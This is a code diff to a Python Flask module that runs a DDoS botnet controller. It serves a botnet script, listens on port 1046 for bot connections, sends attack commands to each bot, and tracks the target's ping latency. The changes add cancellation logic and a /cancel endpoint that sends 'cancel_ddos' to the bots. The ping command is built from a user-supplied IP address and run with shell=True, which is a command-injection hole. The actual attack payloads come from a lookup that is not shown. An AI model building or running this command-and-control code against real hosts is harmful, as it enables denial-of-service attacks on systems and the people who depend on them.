@@ -6,13 +6,20 @@ import socket
 import threading
 from app import db
 import sys
+import select
 import datetime
 
 ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
+cancel_event = threading.Event() #  Global cancel event
 latencyPingList = []
+threads = []
+accepted_addresses = set()  # Set to store accepted addresses
+cancelled = False
 
 @ddosAttack.post("/")
 def DDOSAttack():
+    global cancelled, threads, latencyPingList, accepted_addresses, cancel_event
+
     data = request.get_json()
     ipAddress = data["ipAddress"]
     portNumber = data["portNumber"]
@@ -39,40 +46,52 @@ def DDOSAttack():
 
     logActivityDOS("DDOS ATTACK", data, latencyPingList)
     latencyPingList.clear()
+    threads.clear()
+    accepted_addresses.clear()
+    cancel_event.clear()
+    cancelled = False
 
     return ""
 
-def checkLatencyPeriodically(ipAddress, duration):
+def checkLatencyPeriodically(ip_address, duration):
+    global latencyPingList
     command = getCommand("PING", "LATENCY")
-    command = command.format(ipAddress=ipAddress)
-    startTime = datetime.datetime.now()
+    command = command.format(ipAddress=ip_address)
+    start_time = datetime.datetime.now()
     duration = datetime.timedelta(seconds=int(duration))
 
     # poll for latency every 5 seconds
-    while datetime.datetime.now() - startTime < duration:
+    while datetime.datetime.now() - start_time < duration:
+        if cancel_event.is_set():
+            return  # Exit early if the cancel event is set
         latency(command)
         time.sleep(5)
 
 @ddosAttack.post("/latency")
 def checkLatency():
+    global latencyPingList
     if len(latencyPingList) > 0:
         return latencyPingList[-1]
     else:
         return ""
 
 def latency(command):
-    pingCommand = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
-    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish
+    global latencyPingList
+    ping_process = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
+    output, _ = ping_process.communicate()  # Capture the output and wait for the process to finish
 
     lines = output.splitlines()
     line = lines[1]
 
     # append latency ping result to list
     if "time" in line:
-        latencyPingList.append('[PING SUCCESS] ' + line)
+        result = '[PING SUCCESS] ' + line
     else:
-        latencyPingList.append('[PING FAILED] ' + line)
+        result = '[PING FAILED] ' + line
     
+    latencyPingList.append(result)
+    return result
+
 @ddosAttack.get("/botnet")
 def getBotnetScript():
     command = getCommand("DDOS", "BOTNET")
@@ -86,36 +105,43 @@ def send_commands(conn, command):
         print(client_response, end="")
 
 def botnet(command, duration):
+    global threads, accepted_addresses, cancelled
     bindIp = getIpAddress()
     bindPort = 1046
     servAdd = (bindIp, bindPort)
     duration = int(duration)
     
     # create socket to listen
-    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((servAdd))
     server.listen(5)
-    print ("[*] listening on {}:{}".format(bindIp, bindPort))
 
-    threads = [] # Create a list to keep track of threads
-    start_time = time.time()  # Record the start time
+    server.setblocking(0)  # Set the server socket to non-blocking
 
-    while (time.time() - start_time) < duration:
-        try:
-            server.settimeout(duration - (time.time() - start_time))
-            conn, addr = server.accept() # accept the connection
-            
-            # Create a new thread to handle the connection
-            client_thread = threading.Thread(target=handleClient, args=(conn, addr, command))
-            client_thread.start()
-            
-            threads.append(client_thread) # Store the thread in the list
-        except socket.timeout:
-            pass
+    start_time = time.time()
 
-    # Wait for all threads to finish
+    while (time.time() - start_time) < duration and not cancelled:  # assuming should_stop is your exit condition
+        ready_to_read, _, _ = select.select([server], [], [], 1.0)
+
+        if ready_to_read:
+            try:
+                conn, addr = server.accept()
+                ip_address = addr[0]  # Extracting only the IP part from the address tuple
+                if ip_address not in accepted_addresses:
+                    accepted_addresses.add(ip_address)
+                    client_thread = threading.Thread(target=handleClient, args=(conn, addr, command))
+                    client_thread.start()
+                    threads.append(client_thread)
+
+            except socket.error as e:
+                # Handle socket error if needed
+                pass
+
+    # Optionally, wait for all threads to finish
     for thread in threads:
         thread.join()
+
+    server.close()
 
 def handleClient(conn, addr, command):
     # Handle the connection
@@ -130,3 +156,21 @@ def getIpAddress():
     ip = s.getsockname()[0]
     s.close()
     return ip
+
+@ddosAttack.get("/cancel")
+def cancelScan():
+    global threads, cancelled, accepted_addresses
+    cancelled = True
+
+    # send a command to each bot here
+    cancel_command = "cancel_ddos" 
+    for bot_thread in threads:
+        # Extract connection and address from the thread's arguments
+        bot_conn, bot_addr, _ = bot_thread._args  # Accessing the args attribute
+        
+        print(bot_conn, cancel_command)
+
+        # Send the cancel command to the bot
+        send_commands(bot_conn, cancel_command)
+
+    return "activity cancelled"
